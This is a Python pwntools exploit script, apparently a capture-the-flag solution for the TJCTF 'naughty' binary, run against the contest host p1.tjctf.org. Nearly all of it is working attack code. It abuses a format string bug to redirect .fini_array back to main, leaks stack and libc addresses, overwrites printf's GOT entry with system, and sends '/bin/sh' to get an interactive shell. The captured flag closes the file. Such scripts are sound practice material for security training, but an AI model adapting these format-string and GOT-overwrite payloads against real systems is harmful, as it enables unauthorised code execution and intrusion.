#!/usr/bin/env python3
from libformatstr import FormatStr
from pwn import *
if args.LOCAL:
    io = gdb.debug(['./naughty'], gdbscript='''
# main entry point
# b *0x8048536
# printf call site
# b *0x804862f
# ret from main
b *0x8048656
c
''')
else:
    io = remote('p1.tjctf.org', 8004)
io.recvuntil('What is your name?\n')
# 08049bac <.fini_array>: 0x08048500 <__do_global_dtors_aux> -> 08048536 <main>
fmt1 = FormatStr()
fmt1[0x08049bac] = struct.pack('<H', 0x8536)
fmt_leak = b'%19$08x%79$08x  '
assert len(fmt_leak) % 4 == 0
arg_index = 7 + len(fmt_leak) // 4
start_len = 8 * 2 + 2
io.sendline(fmt_leak + fmt1.payload(arg_index=arg_index, start_len=start_len))
io.recvuntil('You are on the NAUGHTY LIST ')
stack = int(io.recv(8), 16)
print(f'stack: 0x{stack:016x}')
libc = int(io.recv(8), 16) - 0x18e81
print(f'libc:  0x{libc:016x}')
assert libc & 0xfff == 0

io.recvuntil('What is your name?\n')
# printf@got = system
# ret = main
fmt2 = FormatStr()
fmt2[0x8049cb0] = libc + 0x3cd10
fmt2[stack - 0x98] = 0x8048536
io.sendline(fmt2.payload(arg_index=7, start_len=0))

io.recvuntil('What is your name?\n')
io.sendline('/bin/sh')

io.interactive()
# tjctf{form4t_strin9s_ar3_on_th3_n1ce_li5t}
